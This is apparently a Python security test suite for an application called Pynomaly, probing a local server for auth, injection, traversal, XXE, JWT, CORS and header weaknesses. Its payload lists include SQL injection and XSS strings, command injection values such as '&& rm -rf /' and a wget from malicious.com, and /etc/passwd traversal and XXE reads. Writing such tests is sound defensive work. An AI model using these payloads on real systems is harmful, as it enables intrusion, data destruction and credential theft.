"""
Comprehensive Security Testing Suite for Pynomaly
This module contains security tests for authentication, authorization, input validation, and more.
"""

import json
import random
import string
import time
from datetime import datetime
from urllib.parse import urljoin

import jwt
import requests


class SecurityTestBase:
    """Base class for security testing"""

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": "PynomaliSecurityTest/1.0",
                "Accept": "application/json",
                "Content-Type": "application/json",
            }
        )

        # Test credentials
        self.test_user = {
            "username": "security_test_user",
            "password": "SecurePassword123!",
            "email": "security@test.com",
        }

        # Security test results
        self.test_results = {"passed": [], "failed": [], "warnings": []}

    def make_request(self, method: str, endpoint: str, **kwargs) -> requests.Response:
        """Make HTTP request with error handling"""
        url = urljoin(self.base_url, endpoint)
        try:
            response = self.session.request(method, url, **kwargs)
            return response
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            raise

    def generate_random_string(self, length: int = 10) -> str:
        """Generate random string for testing"""
        return "".join(random.choices(string.ascii_letters + string.digits, k=length))

    def generate_malicious_payload(self, payload_type: str) -> str:
        """Generate malicious payloads for testing"""
        payloads = {
            "sql_injection": [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM users --",
                "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')></iframe>",
            ],
            "command_injection": [
                "; ls -la",
                "| cat /etc/passwd",
                "&& rm -rf /",
                "; wget http://malicious.com/malware.sh",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc//passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            ],
            "ldap_injection": [
                "*)(&(objectClass=*)",
                "*)(|(password=*))",
                "*)(|(uid=*))",
                "*)(|(cn=*))",
            ],
            "xml_injection": [
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://malicious.com/malware'>]><root>&test;</root>",
            ],
        }

        return random.choice(payloads.get(payload_type, [""]))

    def record_test_result(
        self, test_name: str, passed: bool, message: str = "", severity: str = "info"
    ):
        """Record test result"""
        result = {
            "test_name": test_name,
            "timestamp": datetime.now().isoformat(),
            "message": message,
            "severity": severity,
        }

        if passed:
            self.test_results["passed"].append(result)
        else:
            self.test_results["failed"].append(result)

    def generate_test_report(self) -> dict:
        """Generate comprehensive test report"""
        total_tests = len(self.test_results["passed"]) + len(
            self.test_results["failed"]
        )

        report = {
            "summary": {
                "total_tests": total_tests,
                "passed": len(self.test_results["passed"]),
                "failed": len(self.test_results["failed"]),
                "warnings": len(self.test_results["warnings"]),
                "success_rate": (len(self.test_results["passed"]) / total_tests * 100)
                if total_tests > 0
                else 0,
            },
            "details": self.test_results,
            "generated_at": datetime.now().isoformat(),
        }

        return report


class AuthenticationSecurityTests(SecurityTestBase):
    """Authentication security tests"""

    def test_user_registration_security(self):
        """Test user registration security"""
        test_cases = [
            # Test weak password
            {
                "username": "testuser1",
                "password": "123",
                "email": "test1@test.com",
                "should_fail": True,
                "reason": "weak_password",
            },
            # Test SQL injection in username
            {
                "username": "'; DROP TABLE users; --",
                "password": "SecurePass123!",
                "email": "test2@test.com",
                "should_fail": True,
                "reason": "sql_injection",
            },
            # Test XSS in username
            {
                "username": "<script>alert('XSS')</script>",
                "password": "SecurePass123!",
                "email": "test3@test.com",
                "should_fail": True,
                "reason": "xss_attempt",
            },
            # Test invalid email format
            {
                "username": "testuser4",
                "password": "SecurePass123!",
                "email": "invalid-email",
                "should_fail": True,
                "reason": "invalid_email",
            },
            # Test duplicate username
            {
                "username": "admin",
                "password": "SecurePass123!",
                "email": "admin@test.com",
                "should_fail": True,
                "reason": "duplicate_username",
            },
        ]

        for case in test_cases:
            response = self.make_request("POST", "/auth/register", json=case)

            if case["should_fail"]:
                if response.status_code == 400 or response.status_code == 409:
                    self.record_test_result(
                        f"registration_security_{case['reason']}",
                        True,
                        f"Properly rejected {case['reason']}",
                    )
                else:
                    self.record_test_result(
                        f"registration_security_{case['reason']}",
                        False,
                        f"Failed to reject {case['reason']}: {response.status_code}",
                        "high",
                    )

    def test_login_security(self):
        """Test login security"""
        # Test brute force protection
        for i in range(10):
            response = self.make_request(
                "POST",
                "/auth/login",
                json={"username": "admin", "password": "wrongpassword"},
            )

        # Check if rate limiting is in place
        response = self.make_request(
            "POST",
            "/auth/login",
            json={"username": "admin", "password": "wrongpassword"},
        )

        if response.status_code == 429:
            self.record_test_result(
                "login_brute_force_protection",
                True,
                "Rate limiting properly implemented",
            )
        else:
            self.record_test_result(
                "login_brute_force_protection",
                False,
                "No rate limiting detected",
                "high",
            )

    def test_session_management(self):
        """Test session management security"""
        # Login to get session token
        response = self.make_request(
            "POST",
            "/auth/login",
            json={
                "username": self.test_user["username"],
                "password": self.test_user["password"],
            },
        )

        if response.status_code == 200:
            token = response.json().get("access_token")

            # Test token expiration
            if token:
                try:
                    payload = jwt.decode(token, options={"verify_signature": False})
                    exp = payload.get("exp")

                    if exp:
                        exp_time = datetime.fromtimestamp(exp)
                        current_time = datetime.now()

                        if exp_time > current_time:
                            self.record_test_result(
                                "token_expiration", True, f"Token expires at {exp_time}"
                            )
                        else:
                            self.record_test_result(
                                "token_expiration",
                                False,
                                "Token already expired",
                                "medium",
                            )
                except Exception as e:
                    self.record_test_result(
                        "token_format", False, f"Invalid token format: {e}", "medium"
                    )

    def test_password_reset_security(self):
        """Test password reset security"""
        # Test password reset with invalid email
        response = self.make_request(
            "POST", "/auth/password-reset", json={"email": "nonexistent@test.com"}
        )

        # Should not reveal whether email exists
        if response.status_code == 200:
            self.record_test_result(
                "password_reset_email_enumeration",
                True,
                "Does not reveal email existence",
            )
        else:
            self.record_test_result(
                "password_reset_email_enumeration",
                False,
                "May reveal email existence",
                "medium",
            )


class AuthorizationSecurityTests(SecurityTestBase):
    """Authorization security tests"""

    def test_access_control(self):
        """Test access control mechanisms"""
        # Test accessing admin endpoints without authentication
        admin_endpoints = [
            "/admin/users",
            "/admin/settings",
            "/admin/logs",
            "/admin/metrics",
        ]

        for endpoint in admin_endpoints:
            response = self.make_request("GET", endpoint)

            if response.status_code == 401 or response.status_code == 403:
                self.record_test_result(
                    f"access_control_{endpoint.replace('/', '_')}",
                    True,
                    "Properly protected endpoint",
                )
            else:
                self.record_test_result(
                    f"access_control_{endpoint.replace('/', '_')}",
                    False,
                    f"Unprotected admin endpoint: {response.status_code}",
                    "high",
                )

    def test_privilege_escalation(self):
        """Test privilege escalation vulnerabilities"""
        # Test modifying user role
        response = self.make_request("PUT", "/api/v1/users/1", json={"role": "admin"})

        if response.status_code == 401 or response.status_code == 403:
            self.record_test_result(
                "privilege_escalation_role_modification",
                True,
                "Role modification properly protected",
            )
        else:
            self.record_test_result(
                "privilege_escalation_role_modification",
                False,
                "Possible privilege escalation vulnerability",
                "critical",
            )

    def test_horizontal_privilege_escalation(self):
        """Test horizontal privilege escalation"""
        # Test accessing other users' data
        response = self.make_request("GET", "/api/v1/users/2/profile")

        if response.status_code == 401 or response.status_code == 403:
            self.record_test_result(
                "horizontal_privilege_escalation",
                True,
                "User isolation properly implemented",
            )
        else:
            self.record_test_result(
                "horizontal_privilege_escalation",
                False,
                "Possible horizontal privilege escalation",
                "high",
            )


class InputValidationSecurityTests(SecurityTestBase):
    """Input validation security tests"""

    def test_sql_injection(self):
        """Test SQL injection vulnerabilities"""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
        ]

        endpoints = [
            "/api/v1/users/search",
            "/api/v1/datasets/search",
            "/api/v1/models/search",
        ]

        for endpoint in endpoints:
            for payload in sql_payloads:
                response = self.make_request("POST", endpoint, json={"query": payload})

                # Check for SQL error messages
                if response.status_code == 500:
                    response_text = response.text.lower()
                    if any(
                        keyword in response_text
                        for keyword in ["sql", "mysql", "postgres", "sqlite"]
                    ):
                        self.record_test_result(
                            f"sql_injection_{endpoint.replace('/', '_')}",
                            False,
                            f"SQL injection vulnerability detected: {payload}",
                            "critical",
                        )
                    else:
                        self.record_test_result(
                            f"sql_injection_{endpoint.replace('/', '_')}",
                            True,
                            "SQL injection properly handled",
                        )

    def test_xss_vulnerabilities(self):
        """Test XSS vulnerabilities"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
        ]

        endpoints = ["/api/v1/datasets", "/api/v1/models", "/api/v1/comments"]

        for endpoint in endpoints:
            for payload in xss_payloads:
                response = self.make_request(
                    "POST", endpoint, json={"name": payload, "description": payload}
                )

                if response.status_code == 201:
                    # Check if payload is reflected in response
                    if payload in response.text:
                        self.record_test_result(
                            f"xss_vulnerability_{endpoint.replace('/', '_')}",
                            False,
                            f"XSS vulnerability detected: {payload}",
                            "high",
                        )
                    else:
                        self.record_test_result(
                            f"xss_vulnerability_{endpoint.replace('/', '_')}",
                            True,
                            "XSS properly sanitized",
                        )

    def test_command_injection(self):
        """Test command injection vulnerabilities"""
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; wget http://malicious.com/malware.sh",
        ]

        endpoints = [
            "/api/v1/system/command",
            "/api/v1/export/csv",
            "/api/v1/import/data",
        ]

        for endpoint in endpoints:
            for payload in command_payloads:
                response = self.make_request(
                    "POST", endpoint, json={"command": payload, "filename": payload}
                )

                if response.status_code == 500:
                    response_text = response.text.lower()
                    if any(
                        keyword in response_text
                        for keyword in ["command", "shell", "bash", "sh"]
                    ):
                        self.record_test_result(
                            f"command_injection_{endpoint.replace('/', '_')}",
                            False,
                            f"Command injection vulnerability detected: {payload}",
                            "critical",
                        )
                    else:
                        self.record_test_result(
                            f"command_injection_{endpoint.replace('/', '_')}",
                            True,
                            "Command injection properly handled",
                        )

    def test_path_traversal(self):
        """Test path traversal vulnerabilities"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        endpoints = [
            "/api/v1/files/download",
            "/api/v1/logs/view",
            "/api/v1/reports/export",
        ]

        for endpoint in endpoints:
            for payload in traversal_payloads:
                response = self.make_request("GET", f"{endpoint}?path={payload}")

                if response.status_code == 200:
                    # Check for system file content
                    response_text = response.text.lower()
                    if any(
                        keyword in response_text
                        for keyword in ["root:x:", "administrator", "system"]
                    ):
                        self.record_test_result(
                            f"path_traversal_{endpoint.replace('/', '_')}",
                            False,
                            f"Path traversal vulnerability detected: {payload}",
                            "high",
                        )
                    else:
                        self.record_test_result(
                            f"path_traversal_{endpoint.replace('/', '_')}",
                            True,
                            "Path traversal properly handled",
                        )


class CryptographySecurityTests(SecurityTestBase):
    """Cryptography security tests"""

    def test_password_storage(self):
        """Test password storage security"""
        # Create a test user
        response = self.make_request(
            "POST",
            "/auth/register",
            json={
                "username": "crypto_test_user",
                "password": "TestPassword123!",
                "email": "crypto@test.com",
            },
        )

        if response.status_code == 201:
            # Try to access password directly (should not be possible)
            response = self.make_request("GET", "/api/v1/users/crypto_test_user")

            if response.status_code == 200:
                user_data = response.json()
                if "password" in user_data:
                    self.record_test_result(
                        "password_storage_exposure",
                        False,
                        "Password exposed in user data",
                        "critical",
                    )
                else:
                    self.record_test_result(
                        "password_storage_exposure",
                        True,
                        "Password not exposed in user data",
                    )

    def test_jwt_security(self):
        """Test JWT token security"""
        # Login to get JWT token
        response = self.make_request(
            "POST",
            "/auth/login",
            json={
                "username": self.test_user["username"],
                "password": self.test_user["password"],
            },
        )

        if response.status_code == 200:
            token = response.json().get("access_token")

            if token:
                # Test token structure
                try:
                    header, payload, signature = token.split(".")

                    # Decode header
                    import base64

                    header_decoded = json.loads(base64.b64decode(header + "=="))

                    # Check algorithm
                    if header_decoded.get("alg") == "none":
                        self.record_test_result(
                            "jwt_none_algorithm",
                            False,
                            "JWT uses 'none' algorithm",
                            "critical",
                        )
                    else:
                        self.record_test_result(
                            "jwt_none_algorithm",
                            True,
                            f"JWT uses {header_decoded.get('alg')} algorithm",
                        )

                    # Test token manipulation
                    manipulated_token = token[:-1] + "X"
                    response = self.make_request(
                        "GET",
                        "/api/v1/profile",
                        headers={"Authorization": f"Bearer {manipulated_token}"},
                    )

                    if response.status_code == 401:
                        self.record_test_result(
                            "jwt_manipulation",
                            True,
                            "JWT manipulation properly detected",
                        )
                    else:
                        self.record_test_result(
                            "jwt_manipulation",
                            False,
                            "JWT manipulation not detected",
                            "high",
                        )

                except Exception as e:
                    self.record_test_result(
                        "jwt_format", False, f"JWT format issue: {e}", "medium"
                    )

    def test_encryption_at_rest(self):
        """Test encryption at rest"""
        # Create sensitive data
        response = self.make_request(
            "POST",
            "/api/v1/datasets",
            json={
                "name": "sensitive_dataset",
                "description": "Contains sensitive information",
                "data": [{"credit_card": "4111-1111-1111-1111"}],
            },
        )

        if response.status_code == 201:
            dataset_id = response.json().get("id")

            # Try to access raw data
            response = self.make_request("GET", f"/api/v1/datasets/{dataset_id}/raw")

            if response.status_code == 200:
                raw_data = response.text
                if "4111-1111-1111-1111" in raw_data:
                    self.record_test_result(
                        "encryption_at_rest",
                        False,
                        "Sensitive data not encrypted at rest",
                        "high",
                    )
                else:
                    self.record_test_result(
                        "encryption_at_rest",
                        True,
                        "Sensitive data properly encrypted at rest",
                    )


class APISecurityTests(SecurityTestBase):
    """API security tests"""

    def test_rate_limiting(self):
        """Test API rate limiting"""
        # Make rapid requests
        start_time = time.time()
        request_count = 0
        rate_limited = False

        for i in range(100):
            response = self.make_request("GET", "/api/v1/health")
            request_count += 1

            if response.status_code == 429:
                rate_limited = True
                break

        end_time = time.time()
        duration = end_time - start_time

        if rate_limited:
            self.record_test_result(
                "api_rate_limiting",
                True,
                f"Rate limiting activated after {request_count} requests in {duration:.2f} seconds",
            )
        else:
            self.record_test_result(
                "api_rate_limiting",
                False,
                f"No rate limiting detected after {request_count} requests",
                "medium",
            )

    def test_cors_configuration(self):
        """Test CORS configuration"""
        # Test CORS headers
        response = self.make_request(
            "OPTIONS",
            "/api/v1/datasets",
            headers={
                "Origin": "https://malicious.com",
                "Access-Control-Request-Method": "GET",
            },
        )

        if response.status_code == 200:
            cors_header = response.headers.get("Access-Control-Allow-Origin")

            if cors_header == "*":
                self.record_test_result(
                    "cors_wildcard", False, "CORS allows all origins (*)", "medium"
                )
            else:
                self.record_test_result(
                    "cors_wildcard", True, f"CORS properly configured: {cors_header}"
                )

    def test_http_methods(self):
        """Test HTTP method security"""
        dangerous_methods = ["TRACE", "TRACK", "OPTIONS", "PATCH", "DELETE"]

        for method in dangerous_methods:
            response = self.make_request(method, "/api/v1/datasets")

            if method in ["TRACE", "TRACK"] and response.status_code == 200:
                self.record_test_result(
                    f"http_method_{method}",
                    False,
                    f"Dangerous HTTP method {method} enabled",
                    "medium",
                )
            else:
                self.record_test_result(
                    f"http_method_{method}",
                    True,
                    f"HTTP method {method} properly handled",
                )

    def test_content_type_validation(self):
        """Test content type validation"""
        # Test malicious content types
        malicious_payloads = [
            ("application/x-www-form-urlencoded", "username=admin&password=admin"),
            (
                "text/xml",
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            ),
            ("multipart/form-data", "malicious file upload attempt"),
        ]

        for content_type, payload in malicious_payloads:
            response = self.make_request(
                "POST",
                "/api/v1/datasets",
                headers={"Content-Type": content_type},
                data=payload,
            )

            if response.status_code == 400 or response.status_code == 415:
                self.record_test_result(
                    f"content_type_validation_{content_type.replace('/', '_')}",
                    True,
                    f"Malicious content type {content_type} properly rejected",
                )
            else:
                self.record_test_result(
                    f"content_type_validation_{content_type.replace('/', '_')}",
                    False,
                    f"Malicious content type {content_type} accepted",
                    "medium",
                )


class SecurityHeadersTests(SecurityTestBase):
    """Security headers tests"""

    def test_security_headers(self):
        """Test security headers presence"""
        response = self.make_request("GET", "/")

        security_headers = {
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
            "Referrer-Policy": "strict-origin-when-cross-origin",
        }

        for header, expected_value in security_headers.items():
            actual_value = response.headers.get(header)

            if actual_value:
                self.record_test_result(
                    f"security_header_{header.replace('-', '_').lower()}",
                    True,
                    f"{header}: {actual_value}",
                )
            else:
                self.record_test_result(
                    f"security_header_{header.replace('-', '_').lower()}",
                    False,
                    f"Missing security header: {header}",
                    "medium",
                )

    def test_information_disclosure(self):
        """Test information disclosure in headers"""
        response = self.make_request("GET", "/")

        sensitive_headers = ["Server", "X-Powered-By", "X-AspNet-Version"]

        for header in sensitive_headers:
            if header in response.headers:
                self.record_test_result(
                    f"information_disclosure_{header.replace('-', '_').lower()}",
                    False,
                    f"Sensitive header exposed: {header}: {response.headers[header]}",
                    "low",
                )
            else:
                self.record_test_result(
                    f"information_disclosure_{header.replace('-', '_').lower()}",
                    True,
                    f"Sensitive header {header} properly hidden",
                )


class ComprehensiveSecurityTest:
    """Comprehensive security test runner"""

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.test_classes = [
            AuthenticationSecurityTests,
            AuthorizationSecurityTests,
            InputValidationSecurityTests,
            CryptographySecurityTests,
            APISecurityTests,
            SecurityHeadersTests,
        ]

    def run_all_tests(self) -> dict:
        """Run all security tests"""
        all_results = {
            "summary": {
                "total_tests": 0,
                "passed": 0,
                "failed": 0,
                "warnings": 0,
                "success_rate": 0,
            },
            "test_categories": {},
            "critical_issues": [],
            "high_issues": [],
            "medium_issues": [],
            "low_issues": [],
        }

        for test_class in self.test_classes:
            print(f"Running {test_class.__name__}...")

            test_instance = test_class(self.base_url)

            # Run all test methods
            methods = [
                method for method in dir(test_instance) if method.startswith("test_")
            ]

            for method in methods:
                try:
                    getattr(test_instance, method)()
                except Exception as e:
                    test_instance.record_test_result(
                        method, False, f"Test execution failed: {e}", "high"
                    )

            # Get test results
            test_report = test_instance.generate_test_report()
            all_results["test_categories"][test_class.__name__] = test_report

            # Aggregate results
            all_results["summary"]["total_tests"] += test_report["summary"][
                "total_tests"
            ]
            all_results["summary"]["passed"] += test_report["summary"]["passed"]
            all_results["summary"]["failed"] += test_report["summary"]["failed"]
            all_results["summary"]["warnings"] += test_report["summary"]["warnings"]

            # Categorize issues by severity
            for result in test_report["details"]["failed"]:
                severity = result.get("severity", "medium")
                if severity == "critical":
                    all_results["critical_issues"].append(result)
                elif severity == "high":
                    all_results["high_issues"].append(result)
                elif severity == "medium":
                    all_results["medium_issues"].append(result)
                elif severity == "low":
                    all_results["low_issues"].append(result)

        # Calculate overall success rate
        if all_results["summary"]["total_tests"] > 0:
            all_results["summary"]["success_rate"] = (
                all_results["summary"]["passed"]
                / all_results["summary"]["total_tests"]
                * 100
            )

        return all_results

    def generate_security_report(self, results: dict) -> str:
        """Generate comprehensive security report"""
        report = f"""
# Security Test Report

## Executive Summary
- **Total Tests**: {results["summary"]["total_tests"]}
- **Passed**: {results["summary"]["passed"]}
- **Failed**: {results["summary"]["failed"]}
- **Success Rate**: {results["summary"]["success_rate"]:.2f}%

## Security Issues by Severity

### Critical Issues ({len(results["critical_issues"])})
"""

        for issue in results["critical_issues"]:
            report += f"- **{issue['test_name']}**: {issue['message']}\n"

        report += f"""
### High Issues ({len(results["high_issues"])})
"""

        for issue in results["high_issues"]:
            report += f"- **{issue['test_name']}**: {issue['message']}\n"

        report += f"""
### Medium Issues ({len(results["medium_issues"])})
"""

        for issue in results["medium_issues"]:
            report += f"- **{issue['test_name']}**: {issue['message']}\n"

        report += f"""
### Low Issues ({len(results["low_issues"])})
"""

        for issue in results["low_issues"]:
            report += f"- **{issue['test_name']}**: {issue['message']}\n"

        report += """
## Recommendations

### Critical and High Priority
1. Fix all critical and high severity issues immediately
2. Implement proper input validation and sanitization
3. Ensure authentication and authorization are properly implemented
4. Review and fix any privilege escalation vulnerabilities

### Medium Priority
1. Implement proper security headers
2. Review CORS configuration
3. Implement rate limiting
4. Review encryption implementations

### Low Priority
1. Hide sensitive server information
2. Implement proper error handling
3. Review and update security configurations regularly

## Test Details
"""

        for category, category_results in results["test_categories"].items():
            report += f"""
### {category}
- Total Tests: {category_results["summary"]["total_tests"]}
- Passed: {category_results["summary"]["passed"]}
- Failed: {category_results["summary"]["failed"]}
- Success Rate: {category_results["summary"]["success_rate"]:.2f}%
"""

        return report


if __name__ == "__main__":
    # Run comprehensive security tests
    tester = ComprehensiveSecurityTest()
    results = tester.run_all_tests()

    # Generate report
    report = tester.generate_security_report(results)

    # Save report to file
    with open("security_test_report.md", "w") as f:
        f.write(report)

    # Print summary
    print("\n" + "=" * 50)
    print("SECURITY TEST SUMMARY")
    print("=" * 50)
    print(f"Total Tests: {results['summary']['total_tests']}")
    print(f"Passed: {results['summary']['passed']}")
    print(f"Failed: {results['summary']['failed']}")
    print(f"Success Rate: {results['summary']['success_rate']:.2f}%")
    print(f"Critical Issues: {len(results['critical_issues'])}")
    print(f"High Issues: {len(results['high_issues'])}")
    print(f"Medium Issues: {len(results['medium_issues'])}")
    print(f"Low Issues: {len(results['low_issues'])}")
    print("=" * 50)

    if results["critical_issues"] or results["high_issues"]:
        print("\n⚠️  SECURITY ISSUES FOUND - IMMEDIATE ACTION REQUIRED")
        exit(1)
    else:
        print("\n✅ No critical or high severity issues found")
        exit(0)
